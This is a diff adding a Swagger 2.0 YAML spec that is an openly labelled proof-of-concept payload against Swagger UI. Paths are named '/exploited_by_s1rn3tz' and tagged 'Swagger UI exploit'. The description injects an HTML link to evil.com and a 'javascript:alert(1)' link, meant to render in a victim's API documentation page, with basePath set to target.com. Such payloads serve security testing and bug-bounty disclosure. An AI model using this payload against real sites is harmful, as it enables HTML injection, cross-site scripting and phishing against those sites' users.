@@ -1,0 +1,59 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |
+    Ceci est l'ancienne documentation de l'API, retrouvez la nouvelle version <a href="https://evil.com">ici</a> <a href=javascript:alert(1);>test</a>
+ 
+  version: production
+basePath: https://target.com
+produces:
+- application/xml
+- application/json
+consumes:
+- application/xml
+- application/json
+security:
+- basicAuth: []
+paths:
+  "/s1rn3tz":
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - Mathis Pais De Sousa
+      operationId: findAccounts
+      summary: this is example text
+  "/exploited_by_s1rn3tz":
+    delete:
+      parameters:
+      - description: |
+<a href=https://s1rn3tz.gitbook.io>blog</a>
+ 
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - Swagger UI exploit
+      operationId: swagger
+      summary: swagger
+    get:
+      parameters:
+      - description: this is example text
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - Swagger UI exploit
+      operationId: some_operation
+      summary: this is example text
